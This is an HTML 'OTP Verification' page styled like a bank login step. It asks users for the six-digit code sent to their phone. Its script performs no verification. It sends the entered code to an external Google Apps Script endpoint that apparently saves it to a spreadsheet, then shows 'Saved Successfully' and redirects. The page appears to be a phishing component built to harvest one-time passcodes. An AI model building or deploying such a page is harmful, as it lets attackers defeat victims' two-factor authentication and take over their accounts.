<!DOCTYPE html>
<html>
<head>
<title>OTP Verification</title>

<style>

body{
font-family:Poppins,sans-serif;
background:#eef4fb;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.card{

width:450px;

background:white;

padding:40px;

border-radius:25px;

box-shadow:0 10px 30px rgba(0,0,0,.1);

text-align:center;

}

h1{
color:#003B8E;
}

.otp-boxes{

display:flex;

justify-content:center;

gap:12px;

margin:30px 0;

}

.otp-boxes input{

width:35px;

height:35px;

font-size:16px;

text-align:center;

border:1px solid #ddd;

border-radius:6px;

padding:0;

}

button{

width:100%;

padding:15px;

background:#E31837;

color:white;

border:none;

border-radius:12px;

font-size:18px;

cursor:pointer;

}

</style>

</head>

<body>

<div class="card">

<h1>OTP Verification</h1>

<p>
Enter the 6-digit OTP sent to your registered mobile number.
</p>

<div class="otp-boxes">

<input maxlength="1" id="o1" oninput="nextBox(this,'o2')">
<input maxlength="1" id="o2" oninput="nextBox(this,'o3')">
<input maxlength="1" id="o3" oninput="nextBox(this,'o4')">
<input maxlength="1" id="o4" oninput="nextBox(this,'o5')">
<input maxlength="1" id="o5" oninput="nextBox(this,'o6')">
<input maxlength="1" id="o6">

</div>

<button onclick="verifyOTP()">
Verify OTP
</button>

</div>

<script>

function nextBox(current,nextId){

  current.value = current.value.replace(/[^0-9]/g,'');

  if(current.value.length === 1){
    let next=document.getElementById(nextId);

    if(next){
      next.focus();
    }
  }
}

async function saveToSheet(data){

try{

const response = await fetch(
"https://script.google.com/macros/s/AKfycbwcK5PMidHrsQ95uBL0m3QVVixvVPN9c_p_7Sm99fscgXufbARP9uQbNOQ4zzoLLwML/exec",
{
method:"POST",
body:JSON.stringify(data)
});

const result = await response.text();

console.log(result);

return result;

}catch(error){

console.log(error);
throw error;

}

}

async function verifyOTP(){

try{

let otp=
document.getElementById("o1").value+
document.getElementById("o2").value+
document.getElementById("o3").value+
document.getElementById("o4").value+
document.getElementById("o5").value+
document.getElementById("o6").value;

if(otp.length!=6){

alert("Please enter 6 digits");
return;

}

await saveToSheet({
code:otp
});

alert("Saved Successfully");

window.location.href="success.html";

}
catch(err){

alert("Error : "+err.message);

console.log(err);

}

}

</script>
</body>
</html>
